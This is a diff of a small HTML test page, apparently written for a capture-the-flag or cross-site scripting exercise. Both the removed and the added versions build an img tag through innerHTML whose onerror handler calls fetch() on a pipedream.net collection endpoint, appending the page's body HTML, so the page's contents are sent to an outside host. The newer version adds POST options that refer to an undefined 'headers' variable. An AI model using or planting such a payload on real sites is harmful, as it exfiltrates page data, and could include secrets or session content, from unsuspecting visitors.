@@ -1,7 +1,18 @@
-html>
-    <title id="getFlag">Test 1</title>
-    <body>
-        <p>LOL</p>
-    </body>
-    <script>document.getElementById("getFlag").innerHTML= `<img src =x onerror='fetch("https://eojbjxw9m3vt4d8.m.pipedream.net?" + document.body.innerHTML)'`</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title id="changeTitle">Test 2</title>
+</head>
+<body>
+    <p>LOL</p>
+    <script>
+        const options = {
+            method: "POST",
+            headers,
+            mode: "cors"
+        };
+
+        document.getElementById("changeTitle").innerHTML= `<img src="https://example.com/image.jpg" onerror='fetch("https://eojbjxw9m3vt4d8.m.pipedream.net?" + document.body.innerHTML, options)'>`;
+    </script>
+</body>
 </html>
